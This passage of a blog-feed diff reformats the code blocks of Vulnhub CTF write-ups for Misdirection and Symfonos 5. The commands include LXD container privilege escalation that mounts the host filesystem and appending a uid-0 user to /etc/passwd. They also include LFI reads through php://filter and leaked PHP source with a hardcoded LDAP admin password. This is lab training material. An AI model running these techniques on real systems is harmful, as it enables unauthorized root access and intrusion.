+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p>
 &lt;p>We then need to transfer this two files to our victim for privesc.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># on kali&lt;/span>
-python3 -m http.server
-&lt;span style="color:#75715e"># on victim&lt;/span>
-wget 192.168.191.1:8000/lxd.tar.xz
-wget 192.168.191.1:8000/rootfs.squashfs
-lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
-lxc image list
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># on kali&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python3 -m http.server
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># on victim&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wget 192.168.191.1:8000/lxd.tar.xz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wget 192.168.191.1:8000/rootfs.squashfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lxc image list
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-5.png" class="center" style="border-radius: 8px;" />
 &lt;p>After adding the image we need to run lxd init and can keep everything default.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxd init
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>lxd init
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-7.png" class="center" style="border-radius: 8px;" />
 &lt;p>Then create the container to be privileged and mount the host os file system inside it.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxc init alpine privesc -c security.privileged&lt;span style="color:#f92672">=&lt;/span>true
-lxc config device add privesc host-root disk source&lt;span style="color:#f92672">=&lt;/span>/ path&lt;span style="color:#f92672">=&lt;/span>/mnt/root recursive&lt;span style="color:#f92672">=&lt;/span>true
-lxc start privesc
-lxc exec privesc /bin/sh
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this we can read the host file system from inside the container and can read root.txt.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>lxc init alpine privesc -c security.privileged&lt;span style="color:#f92672">=&lt;/span>true
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lxc config device add privesc host-root disk source&lt;span style="color:#f92672">=&lt;/span>/ path&lt;span style="color:#f92672">=&lt;/span>/mnt/root recursive&lt;span style="color:#f92672">=&lt;/span>true
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lxc start privesc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lxc exec privesc /bin/sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this we can read the host file system from inside the container and can read root.txt.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-9.png" class="center" style="border-radius: 8px;" />
@@ -398,12 +414,13 @@ lxc exec privesc /bin/sh
 &lt;p>The passwd file is writeable by the users in the brexit group.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-11.png" class="center" style="border-radius: 8px;" />
 &lt;p>We can add user with id 0 that will give us root privileges.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">openssl passwd -1 -salt user password123
-echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>openssl passwd -1 -salt user password123
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-12.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="references">References&lt;/h2>
-&lt;pre>&lt;code>https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/
+&lt;pre tabindex="0">&lt;code>https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/
 https://www.hackingarticles.in/lxd-privilege-escalation/
 https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
 &lt;/code>&lt;/pre></content></item><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -431,38 +448,39 @@ password that we could use to ssh into the machine. For privilege escalation to 
 dpkg.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
-389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
-636/tcp open ldapssl?
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open ldapssl?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="389636-ldap">389,636 (LDAP)&lt;/h2>
 &lt;p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
 get back to it incase we land on some credentials.&lt;/p>
 &lt;p>&lt;strong>nmap scripts&lt;/strong>:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -p 389,636 --script ldap-* 192.168.191.132
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p 389,636 --script ldap-* 192.168.191.132
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>&lt;strong>ldapsearch&lt;/strong>:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h2 id="80-http">80 (HTTP)&lt;/h2>
 &lt;p>Opening the site on the browser, we only get a plain page with an image.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -481,138 +499,157 @@ we can abuse LFI to access other files on disk by directory traversal.&lt;/p>
 files so we can check the source code of the app.&lt;/p>
 &lt;p>Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p>
 &lt;p>&lt;strong>home.php&lt;/strong>&lt;/p>
-&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;span style="color:#a6e22e">session_start&lt;/span>();
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
-{
-$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
-$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
-}
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} else {
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
-&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;span style="color:#a6e22e">session_start&lt;/span>();
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
-$ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
-&lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
-$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
-}
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
-$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
-$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
-$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
-$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
-} &lt;span style="color:#66d9ef">else&lt;/span> {
-$_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-}
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
